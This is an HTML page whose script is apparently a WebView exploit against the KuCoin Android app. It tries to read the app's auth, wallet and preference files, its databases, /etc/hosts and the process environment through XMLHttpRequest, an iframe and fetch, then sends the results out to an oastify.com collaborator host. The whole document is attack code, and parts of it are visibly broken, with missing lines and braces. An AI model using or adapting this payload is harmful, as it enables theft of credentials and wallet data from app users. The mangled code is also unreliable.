<html><body><script>
var d="";

// 1. Try reading app shared_prefs via file://
var files=[
  "file:///data/data/com.kubi.kucoin/shared_prefs/com.kubi.kucoin_preferences.xml",
  "file:///data/data/com.kubi.kucoin/shared_prefs/auth.xml",

  "file:///data/data/com.kubi.kucoin/shared_prefs/wallet.xml",

  "file:///data/data/com.kubi.kucoin/databases/",
  "file:///etc/hosts",
  "file:///proc/self/environ"
];

var count=0;
files.forEach(function(f){

    var x=new XMLHttpRequest();

    x.send();

      d+="FILE_OK:"+f+"="+x.responseText.substring(0,100)+"|";
    }
  }catch(e){
    d+="FILE_ERR:"+f.split("/").pop()+":"+e.message.substring(0,30)+"|";
  }
  count++;
  if(count>=files.length) doExfil();
});

// 2. Try iframe file access
try{
  var iframe=document.createElement("iframe");
  iframe.src="file:///data/data/com.kubi.kucoin/shared_prefs/";
  iframe.onload=function(){
    try{
      d+="IFRAME_OK:"+iframe.contentDocument.body.innerHTML.substring(0,200);
    }catch(e){d+="IFRAME_BLOCKED:"+e.message.substring(0,50);}
    doExfil();

try{

    return r.text();
  }).then(function(t){
    d+="FETCH_FILE:"+t.substring(0,200);
    doExfil();
  }).catch(function(e){d+="FETCH_ERR:"+e.message.substring(0,50)+";";});
}catch(e){}

function doExfil(){
  window.location="https://604kkqv5a6n5ut14cwpolkzpmgsegjousuuwyeg3.oastify.com/?d="+encodeURIComponent(d.substring(0,1800));

setTimeout(function(){doExfil();},4000);
</script></body></html>
